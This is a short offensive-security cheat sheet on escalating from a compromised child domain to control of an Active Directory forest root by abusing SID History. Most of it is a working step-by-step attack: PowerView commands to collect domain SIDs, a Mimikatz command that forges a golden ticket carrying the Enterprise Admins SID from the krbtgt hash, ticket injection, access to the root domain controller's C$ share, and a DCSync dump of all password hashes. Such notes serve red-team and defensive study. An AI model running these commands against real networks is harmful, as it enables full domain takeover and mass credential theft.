**WHAT IS THIS?:**

If we manage to compromise a child domain of a forest and [SID filtering](https://www.itprotoday.com/windows-8/sid-filtering) isn't enabled (most of the times is not), we can abuse it to escalate privileges to Domain Administrator of the root domain of the forest. This is possible because of the [SID History](https://www.itprotoday.com/windows-8/sid-history) field on a Kerberos TGT ticket, that defines the "extra" security groups and privileges.

---

# Exploitation Example
- Get the SID of the Current Domain using PowerView:
```powershell
Get-DomainSID -Domain current.root.domain.local
```
- Get the SID of the Root Domain using PowerView:
```powershell
Get-DomainSID -Domain root.domain.local
```
- Create the Enteprise Admins SID:
```powershell
Format: RootDomainSID-519
```
- Forge "Extra" Golden Ticket using Mimikatz:
```js
kerberos::golden /user:Administrator /domain:current.root.domain.local /sid:<CurrentDomainSID> /krbtgt:<krbtgtHash> /sids:<EnterpriseAdminsSID> /startoffset:0 /endin:600 /renewmax:10080 /ticket:\path\to\ticket\golden.kirbi
```
- Inject the ticket into memory:
```powershell
kerberos::ptt \path\to\ticket\golden.kirbi
```
- List the DC of the Root Domain:
```powershell
dir \\dc.root.domain.local\C$
```
- Or DCSync and dump the hashes using Mimikatz:
```powershell
lsadump::dcsync /domain:root.domain.local /all
```

### Detailed Articles
- [Kerberos Golden Tickets are Now More Golden](https://adsecurity.org/?p=1640)
- [A Guide to Attacking Domain Trusts](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
